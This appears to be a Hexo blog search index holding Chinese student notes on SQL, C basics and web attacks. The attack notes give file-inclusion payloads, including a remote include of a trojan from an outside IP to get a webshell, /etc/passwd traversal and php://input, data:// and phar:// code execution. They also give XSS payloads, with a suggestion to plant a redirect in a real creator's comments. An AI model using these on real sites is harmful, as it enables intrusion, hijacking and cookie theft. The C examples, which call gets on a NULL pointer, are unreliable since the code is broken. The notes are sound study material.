<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>周记3-SQL注入,RCE</title>
      <link href="/2023/10/22/%E5%91%A8%E8%AE%B0-2023-10-22-%E5%91%A8%E8%AE%B03/"/>
      <url>/2023/10/22/%E5%91%A8%E8%AE%B0-2023-10-22-%E5%91%A8%E8%AE%B03/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>何为sql注入?简单来说就是攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作</p><p>例如对于一些安全性较低的登录页面,因为这些用户的数据都是存储在数据库中,那么就可以进行SQL注入来查询敏感信息或者做更多恶意操作</p><h3 id="mysql数据库结构"><a href="#mysql数据库结构" class="headerlink" title="mysql数据库结构"></a>mysql数据库结构</h3><p>mysql数据库5.0以上版本有一个自带的数据库叫做information_schema,该数据库下面有两个表一个是tables和columns。tables这个表的table_name字段下面是所有数据库存在的表名。table_schema字段下是所有表名对应的数据库名。columns这个表的colum_name字段下是所有数据库存在的字段名。columns_schema字段下是所有表名对应的数据库。了解这些对于我们之后去查询数据有很大帮助。</p><p><strong>mysql数据库常用默认的端口为3306</strong></p><h3 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h3><p>在进行SQL注入之前,我们肯定要学习一下SQL语句,接下来介绍一些常用的语句和基本语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">启动运行mysql:</span><br><span class="line">在命令行输入mysql -u root -p后输入密码root</span><br><span class="line"></span><br><span class="line">基本规范:</span><br><span class="line">sql语句要在末尾加分号</span><br><span class="line">建议区分大小写(windows系统对大小写不敏感但Linux系统区分大小写)</span><br><span class="line">数据库基本结构为 数据库-&gt;表-&gt;列-&gt;单元</span><br><span class="line"></span><br><span class="line">数据库/表(若对表操作就把其中的database换成table):</span><br><span class="line">创建一个名为ytm666的数据库:create database ytm666;</span><br><span class="line">删除一个名为ytm666的数据库:drop database ytm666;</span><br><span class="line">使用一个名为ytm666的数据库:use ytm666;</span><br><span class="line">展示出服务器下的所有数据库:show databases;</span><br><span class="line"></span><br><span class="line">常用数据类型:</span><br><span class="line">int float double char和C语言同理,但有一个不同的是varchar即为长一点的字符串</span><br><span class="line"></span><br><span class="line">重要特性(赋给表中数据的特性):</span><br><span class="line">primary key 主键,唯一并且不能为空</span><br><span class="line">unique 唯一</span><br><span class="line">not null 不能为空</span><br><span class="line">auto_increment 自增</span><br><span class="line">* 此符号在sql语言中代表所有</span><br><span class="line"></span><br><span class="line">基本语句:</span><br><span class="line">use 一个数据库</span><br><span class="line">select 要查的数据 from 表名 where 列名 = 某个值</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>培训笔记2</title>
      <link href="/2023/10/18/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-18-%E7%AC%94%E8%AE%B02/"/>
      <url>/2023/10/18/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-18-%E7%AC%94%E8%AE%B02/</url>
      
        <content type="html"><![CDATA[<h2 id="实用技巧"><a href="#实用技巧" class="headerlink" title="实用技巧"></a>实用技巧</h2><h3 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h3><ol><li><p>复制粘贴剪贴撤回: Ctrl + c &#x2F; v &#x2F; x &#x2F; z</p></li><li><p>移动代码块: Alt + 上下 或 鼠标拖动</p></li><li><p>快速复制: Alt + Shift + 上下</p></li><li><p>注释代码: Ctrl + ／</p></li><li><p>缩进: Tab &#x2F; Shift + Tab</p></li><li><p>删除单个单词: Ctrl + Backspace</p></li><li><p>切换窗口: Ctrl + Tab 应用内切换窗口<br>      Alt + Tab 切换所有窗口<br>      Win + Tab 切换应用</p></li></ol><h3 id="使用工具-软件"><a href="#使用工具-软件" class="headerlink" title="使用工具 &amp; 软件"></a>使用工具 &amp; 软件</h3><ol><li><p>截图: Ctrl + Alt + A (QQ) &#x2F; Win + Shift + S (系统)</p></li><li><p>录制: Win + G(系统) &#x2F; OBS</p></li><li><p>笔记: Typora, Obsidian, 飞书云文档, Hexo搭建博客</p></li><li><p>视频课资源: MOOC,BiliBili</p></li><li><p>文件查找: everything</p></li><li><p>思维导图: Xmind</p></li><li><p>电脑防护: 火绒</p></li><li><p>博客 &amp; 文档: 知乎,稀土掘金,Stack Overflow,Github,GPT</p></li></ol><h2 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h2><p>格式化输入输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 有参数时</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;格式化字符&quot;</span>,参数列表);</span><br><span class="line"><span class="comment">// 没有参数时</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;非格式字符串&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> value = <span class="number">6</span>;</span><br><span class="line">    <span class="type">char</span> ch = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">    <span class="type">float</span> f = <span class="number">2.0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %c %f\n&quot;</span>,value,ch,f);<span class="comment">/*输出变量，变量之间空格，并在最后换行*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>首先，scanf函数在读取除字符之外的输入的时候会遵守以下原则：<br>scanf函数每次读取一个字符，跳过所有的空白字符，直到遇到第一个非空白字符的时候才开始读取。</p><p>然后，scanf以删除的方式从缓冲区读入数据(来自标准输入设备的数据存储在缓冲区)<br>也就是说，scanf从缓冲区读入一个数据项，该数据项在缓冲区中就被清除掉了。而如果scanf需要读取一个数据项，发现缓冲区当前是空的，那么程序就会在scanf代码处阻塞，等待用户输入，scanf函数接收到相应的数据项之后，在缓冲区中将这一数据项清除，scanf函数返回，程序继续执行。</p><h3 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h3><p>是内存空间的一部分。也就是说，在内存中预留了一定的存储空间，用来暂时保存输入或输出的数据，这部分预留的空间就叫做缓冲区。缓冲区根据其对应的是输入设备还是输出设备，分为输入缓冲区_和输出缓冲区。_</p><p>scanf遇到空格，回车，tab都可以结束输入，gets只有回车能结束输入（至少输入一个字符或数字）</p><h3 id="字符输入输出"><a href="#字符输入输出" class="headerlink" title="字符输入输出"></a>字符输入输出</h3><h4 id="字符输出函数—-putchar"><a href="#字符输出函数—-putchar" class="headerlink" title="字符输出函数—-putchar()"></a>字符输出函数—-putchar()</h4><p>把从输出缓冲区中读取单个字符输出到标准输出设备</p><p>putchar(变量)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i =<span class="number">67</span>;        <span class="comment">/*定义一个整型变量*/</span></span><br><span class="line">    <span class="type">char</span> ch = <span class="string">&#x27;C&#x27;</span>;    <span class="comment">/*定义一个字符变量*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">putchar</span>(i);        <span class="comment">/*数字 67 的 ASCII是大写字母 C*/</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);    <span class="comment">/*换行效果，屏幕不显示*/</span></span><br><span class="line">    <span class="built_in">putchar</span>(ch);    <span class="comment">/*输出字符变量*/</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;C&#x27;</span>);    <span class="comment">/*输出字符常量*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="字符输入函数—-getchar"><a href="#字符输入函数—-getchar" class="headerlink" title="字符输入函数—-getchar()"></a>字符输入函数—-getchar()</h4><p>从输入缓冲区上读取单个字符，返回值是字符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> ch = <span class="number">0</span>;<span class="comment">/*初始化变量*/</span></span><br><span class="line"></span><br><span class="line">    ch = getchar();<span class="comment">/*字符输入*/</span></span><br><span class="line">    <span class="built_in">putchar</span>(ch);<span class="comment">/*输出变量*/</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);<span class="comment">/*换行*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串输入输出"><a href="#字符串输入输出" class="headerlink" title="字符串输入输出"></a>字符串输入输出</h3><p>我们在编程的时候，经常要对字符进行操作</p><h4 id="字符串输出函数—-puts"><a href="#字符串输出函数—-puts" class="headerlink" title="字符串输出函数—-puts()"></a>字符串输出函数—-puts()</h4><p>从缓冲区中读取已经存在的字符串（包括空白字符）输出到标准输出设备并换行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(s);<span class="comment">/*s 为字符串变量*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[] = <span class="string">&quot;hello world!&quot;</span>;<span class="comment">/*定义一个数组，储存了一串字符串*/</span></span><br><span class="line">    <span class="type">char</span>* s=<span class="literal">NULL</span>;    <span class="comment">/*定义一个指针变量，初始化为空*/</span></span><br><span class="line"></span><br><span class="line">    s = <span class="string">&quot;hello world!&quot;</span>;    <span class="comment">/*指针指向一个字符串*/</span></span><br><span class="line">    <span class="built_in">puts</span>(str);<span class="comment">/*输出字符串*/</span></span><br><span class="line">    <span class="built_in">puts</span>(s);<span class="comment">/*输出字符串*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式里的字符串变量s在这里是数组 str 和指针 s。puts() 函数的作用与printf(“%s\n”,s)相同—–输出字符串并换行。</p><p>注 意：<br>①数组是同一类型的数据的集合，指针是用来表示内存地址的。后面会独立的介绍，在这里只要知道数组变量和指针变量可以存储字符串就行了。②puts()函数在遇到”\0”时，就会被替换为 “\n”，实现换行。</p><h4 id="字符串输入函数—–gets"><a href="#字符串输入函数—–gets" class="headerlink" title="字符串输入函数—–gets()"></a>字符串输入函数—–gets()</h4><p>读取输入缓冲区中存在的字符，直到遇到回车结束</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">26</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> *s = <span class="literal">NULL</span>;<span class="comment">/*定义一个数组和一个指针变量*/</span></span><br><span class="line"></span><br><span class="line">    gets(str);<span class="comment">/*获取输入的字符串*/</span></span><br><span class="line">    gets(s);<span class="comment">/*获取输入的字符串*/</span></span><br><span class="line">    <span class="built_in">puts</span>(str);<span class="comment">/*输出字符串*/</span></span><br><span class="line">    <span class="built_in">puts</span>(s);<span class="comment">/*输出字符串*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：<br>①用 gets 函数获取的字符串一般是放在字符变量里，也是使用数组变量和指针变量。gets 函数除了有输入字符的功能外，还有换行的作用。<br>②scanf()函数和gets()函数有明显区别，scanf函数在遇到空格、回车、空白符时结束输入，gets ()函数仅在遇到回车时结束输入。</p><h2 id="代码规范"><a href="#代码规范" class="headerlink" title="代码规范"></a>代码规范</h2><ol><li>写注释</li><li>变量命名（不能太随便太奇怪）</li><li>空行：独立代码块之间要空行<br>每个函数定义结束要空行等</li><li>缩进：if，switch，for等（条件下内部执行的语句要缩进）<strong>特殊</strong>：只有一条if可以放一行</li><li>分行：定义变量可以一个变量分一列</li><li>减少嵌套</li><li>空格：等号大小于号等双目运算符左右要空格(单目运算符前后不空格，如正负号)</li></ol><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>&amp;&amp;优先级大于||：在没有括号的情况下，||左右可以有带&amp;&amp;的组合式（优先结合&amp;&amp;）</p><p>if的括号里可以赋值，返回值就是赋的值：如if(a&#x3D;0)则返回值是0，不执行结果</p><h3 id="短路特性"><a href="#短路特性" class="headerlink" title="短路特性"></a>短路特性</h3><ol><li>如果if成立，<br>  不再执行后面的else if和else</li><li>如果&amp;&amp;的前面不成立，<br> 不再执行后面的内容</li><li>如果||的前面成立，<br>  不再执行后面的内容<br>多用于if赋值的情形</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 短路特性 例子1-1</span></span><br><span class="line"> <span class="type">int</span> a = <span class="number">2</span>, b = <span class="number">3</span>, c = <span class="number">4</span>;</span><br><span class="line"> <span class="keyword">if</span>((a = a &lt; b) || (c = <span class="number">3</span>)) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;a = %d , c = %d&quot;</span>, a, c);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>如以上结果输出a&#x3D;1,c&#x3D;4<br>因为先判断a&lt;b部分结果为真返回1赋值给a,那么此时a为1<br>那么在||运算符中前部分为真就已经可以使其生效,那么后面的c&#x3D;3语句就不再执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//例子1-2</span></span><br><span class="line"><span class="type">int</span> a = <span class="number">2</span>, b = <span class="number">3</span>, c = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">if</span>((a /= b) &amp;&amp; (c = a-b)) &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;qwq&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a = %d , c = %d&quot;</span>, a, c);</span><br></pre></td></tr></table></figure><p>以上结果输出a&#x3D;0,c&#x3D;4<br>因为a &#x2F;&#x3D; b的结果保留整数为0,此时a为0<br>对于&amp;&amp;运算符必须前后都为真才能生效,那么前部分为0已经为假此语句已经失效,所以后面的c &#x3D; a-b语句不再执行</p><h3 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">计算结果=表达式<span class="number">1</span> ? 表达式<span class="number">2</span> : 表达式<span class="number">3</span></span><br></pre></td></tr></table></figure><p>若表达式1为真执行表达式2,为假执行表达式3</p><p>并且三目运算符可以嵌套,例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">计算结果=表达式<span class="number">1</span>   ?   表达式<span class="number">2</span>   :   表达式<span class="number">3</span>   ?   表达式<span class="number">4</span>  :   表达式<span class="number">5</span></span><br></pre></td></tr></table></figure><h3 id="switch-case语句"><a href="#switch-case语句" class="headerlink" title="switch,case语句"></a>switch,case语句</h3><p>case后面只能是整型或char类型的常量（即整数和单字符’  ‘里面可以是数字和大小写字母等，注意1和’1’是不一样的）</p><p>case后面只能是常量，我们可以预先定义常量：</p><ol><li><p>define定义</p></li><li><p>const定义</p></li></ol><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p>while循环的语法结构类似于if语句</p><p>while循环中一定要注意在循环体内调整循环的次数</p><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>for(初始化 ; 判断条件 ; 条件变量调整）<br>如for( a&#x3D;1 ; a&lt;6 ; a++ ）<br>for循环的三个表达式都可以省略<br>for( ; ; )依然可以执行（无限&#x2F;死循环）<br>表达式2只要不是0都可以执行(输入一个非零数字或者空着都代表无限&#x2F;死循环)<br>☆如果第二项为“非”直接跳出循环，不再执行第三项<br>☆第三项为单纯的a++和++a没有区别，但如果在第三项中调用a的值，则不同</p><h3 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h3><p>无论是三个循环中的哪一个，都可以在循环体中任意位置使用break和continue，break的作用是在满足你设置好的条件语句后，结束循环，而continue是跳过循环体中在continue之后的所有语句，开始进入下一次循环的流程</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>周记2-文件包含,XSS,文件上传</title>
      <link href="/2023/10/15/%E5%91%A8%E8%AE%B0-2023-10-15-%E5%91%A8%E8%AE%B02/"/>
      <url>/2023/10/15/%E5%91%A8%E8%AE%B0-2023-10-15-%E5%91%A8%E8%AE%B02/</url>
      
        <content type="html"><![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>通过php函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。<br>而主要就是php中include()函数:包含并运行指定文件。</p><h3 id="通过远程代码生成webshell"><a href="#通过远程代码生成webshell" class="headerlink" title="通过远程代码生成webshell"></a>通过远程代码生成webshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果我自建一个111.230.199.201&#x2F;test.txt这样的网站文件并在此写入木马,那么通过以下语句就能使目标网站运行我的恶意文件做到生成webshell</p><p>?file&#x3D;<a href="http://111.230.199.201/test.txt">http://111.230.199.201/test.txt</a><br>条件：allow_url_fopen、allow_url_include为on</p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>如果是linux，可以以绝对路径查看?file&#x3D;&#x2F;etc&#x2F;passwd等敏感文件或是查看相对路径?file&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd等敏感文件</p><p>还可以加一些不存在的目录名，进行穿越、绕过,例如:?file&#x3D;&#x2F;etc&#x2F;ytm666&#x2F;..&#x2F;passwd</p><p>也可以使用file:&#x2F;&#x2F;伪协议:?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>而此伪协议的作用也是用来读取文件,以下重点介绍php伪协议来利用漏洞</p><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h4 id="通过php-filter查看源代码"><a href="#通过php-filter查看源代码" class="headerlink" title="通过php:&#x2F;&#x2F;filter查看源代码"></a>通过php:&#x2F;&#x2F;filter查看源代码</h4><p>构造这种形式的语句可以读取目标文件的源码并进行base64编码</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p><p>而这样可以读取到源码中的注释部分,且这样的方式也可以进行目录穿越的操作,如:</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;<strong>ytm666</strong>&#x2F;resource&#x3D;index.php</p><p>这种形式会使页面报错,但源码依旧会显示出来,所以没有影响.那么这种写法可以绕过一些对于路径有要求的题目,比如要求路径必须包含某些字符,就可以以这种方式绕过</p><h4 id="通过php-input伪协议进行命令执行"><a href="#通过php-input伪协议进行命令执行" class="headerlink" title="通过php:&#x2F;&#x2F;input伪协议进行命令执行"></a>通过php:&#x2F;&#x2F;input伪协议进行命令执行</h4><p>可以将php代码以post请求形式发送执行但要求allow_url_include为on,例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: ?file=php:<span class="comment">//input</span></span><br><span class="line">POST: <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;dir&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="将php代码使用data-伪协议发送执行"><a href="#将php代码使用data-伪协议发送执行" class="headerlink" title="将php代码使用data:&#x2F;&#x2F;伪协议发送执行"></a>将php代码使用data:&#x2F;&#x2F;伪协议发送执行</h4><p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKTs&#x2F;Pg&#x3D;&#x3D;<br>条件：allow_url_fopen、allow_url_include为on<br>注:base64编码<?php system("dir");?>的结果为PD9waHAgc3lzdGVtKCJkaXIiKTs&#x2F;Pg&#x3D;&#x3D;<br>这样可以在网页直接执行编码的语句</p><h4 id="使用phar-伪协议执行压缩包中的恶意文件"><a href="#使用phar-伪协议执行压缩包中的恶意文件" class="headerlink" title="使用phar:&#x2F;&#x2F;伪协议执行压缩包中的恶意文件"></a>使用phar:&#x2F;&#x2F;伪协议执行压缩包中的恶意文件</h4><p>结合文件上传写一个一句话木马的文件shell_dir.php，将shell_dir.php压缩成shell_dir.zip，然后把压缩包重命名为shell_dir_zip.png<br>然后上传shell_dir_zip.png<br>那么结合?file&#x3D;phar:&#x2F;&#x2F;shell_dir_zip.png&#x2F;shell_dir.php这样的语句可以直接执行压缩包内的木马文件</p><p>而zip:&#x2F;&#x2F;伪协议作用一样,但需要改为?file&#x3D;zip:&#x2F;&#x2F;shell_dir_zip.png#shell_dir.php这样的格式</p><h2 id="XSS-跨站脚本"><a href="#XSS-跨站脚本" class="headerlink" title="XSS-跨站脚本"></a>XSS-跨站脚本</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>我们先从最简单的一种情况来引入XSS攻击<br>例如在127.0.0.1&#x2F;xss.php中存在这样的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么这样我们就能进行一个简单的注入,例如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/xss.php?id=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么用户如果点击了类似于这样的攻击型网址,就会执行反射型XSS攻击,并造成危害,这也就是它作为反射型的原因,且只会执行一次</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>不同于反射型一般在url中进行注入,存储型一般会在博客评论，用户评论，留言板等等这些会把数据存储在数据库中的地方注入恶意代码</p><p>那么例如在某些留言板中,输入这样的代码:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么这条代码就被存在了本网站的数据库中,那么作为用户来访问此网页时,就自动的会被执行我们输入的命令,并且由于我们输入的评论(代码)存储在数据库中,所以不必和我们的评论进行交互而是直接会执行</p><h3 id="利用XSS造成危害"><a href="#利用XSS造成危害" class="headerlink" title="利用XSS造成危害"></a>利用XSS造成危害</h3><p>之前的例子中演示了XSS的原理,现在我们可以真正的去利用XSS漏洞来造成危害了,接下来举几个典型的例子</p><h4 id="劫持流量实现恶意跳转"><a href="#劫持流量实现恶意跳转" class="headerlink" title="劫持流量实现恶意跳转"></a>劫持流量实现恶意跳转</h4><p>想象一下,现在你看一个up很火非常不爽,想把它粉丝的流量引走,你可以怎么做呢?</p><p>依据之前的原理,我们可以在这个百万up主的评论中输入这样一段代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;https://Yantm666.github.io&quot;</span>&lt;script&gt;</span></span><br></pre></td></tr></table></figure><p>这样他的粉丝点进去直接就跳转到我的博客了,那么你也成功做到了让这位up失去粉丝的流量,甚至引流到我博客了哈哈(但是你可能需要在他的评论区抢个前排嘿嘿)</p><h4 id="窃取cookie"><a href="#窃取cookie" class="headerlink" title="窃取cookie"></a>窃取cookie</h4><p>用户登录成功后，一般把登录凭证存储在cookie中</p><p>如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。</p><p>登录之后就可以尝试修改你的密码</p><p>我们可以通过这样的代码获取cookie值:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或使用js将cookie发送到特定的网站，通过XSS平台获取管理员cookie</p><h3 id="一些常见绕过"><a href="#一些常见绕过" class="headerlink" 